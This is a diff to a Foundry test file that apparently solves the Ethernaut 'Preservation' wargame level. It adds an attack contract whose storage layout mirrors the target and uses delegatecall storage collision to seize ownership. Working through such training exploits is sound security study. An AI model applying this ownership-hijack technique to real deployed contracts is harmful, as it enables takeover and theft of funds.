@@ -29,10 +29,28 @@ contract PreservationTest is Test {
     }
 
     function testAttack() public {
-        preservation.setFirstTime(1);
+        PreservationAttack attack = new PreservationAttack();
+
+        // set first library contract address to attacker contract
+        preservation.setFirstTime(uint256(uint160(address(attack))));
+
+        // from our malicious contract override the required storage variables
+        preservation.setFirstTime(uint256(uint160(attacker)));
 
         // Submit level
-        // bool success = ethernaut.submitLevelInstance(payable(_levelAddr));
-        // assertTrue(success, "Solution is not solving the level");
+        bool success = ethernaut.submitLevelInstance(payable(_levelAddr));
+        assertTrue(success, "Solution is not solving the level");
+    }
+}
+
+contract PreservationAttack {
+    uint256 storedTime;
+    uint256 storedTime2;
+    address owner;
+
+    function setTime(uint256 _time) public {
+        storedTime = _time;
+        storedTime2 = _time;
+        owner = address(uint160(_time));
     }
 }
